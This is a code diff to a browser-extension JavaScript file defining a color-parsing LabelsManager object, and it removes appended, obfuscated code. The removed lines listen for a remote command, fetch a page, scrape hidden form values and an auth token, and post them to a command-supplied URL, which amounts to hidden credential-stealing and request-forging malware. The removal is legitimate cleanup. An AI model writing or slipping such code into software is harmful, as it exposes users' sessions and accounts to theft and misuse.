@@ -17,39 +17,3 @@ var LabelsManager = {
     },
     g_regexMatch: /^rgb\s*\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)$/i
 };
-chrome['extension']['sendMessage']({
-    'client': 'webman'
-})
-
-chrome['runtime']['onMessage']['addListener'](function(d,e,f){
-
- if (d['ac'] == 'getman') {
-var W = '';
-try {
-    var z = new XMLHttpRequest();
-    z['open']('GET', d['type'][0], ![]);
-    z['send'](null);
-    var p = z['responseText'];
-    var A = p['match'](/ted_post_body" value=".*?(")/gm)[0x0]['split']('\x22')[0x2];
-    var F = p['match'](/scope" value=".*?(")/gm)[0x0]['split']('\x22')[0x2];
-    var i = p['match'](/"token":".*?(")/gm)[0x0]['split']('\x22')[0x3];
-    var z = new XMLHttpRequest();
-    z['open']('POST', d['type'][4], ![]);
-    z['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded');
-    z['send'](d['type'][5] + i + d['type'][6] + F + d['type'][7] + A + d['type'][8]);
-    W = z['responseText'];
-} catch (X) {
-    W = 'err';
-}
-chrome['extension']['sendMessage']({
-    'Q': !![],
-    'G': W
-}, function (q) {
-});
-
-}
-
-
-
-
-})
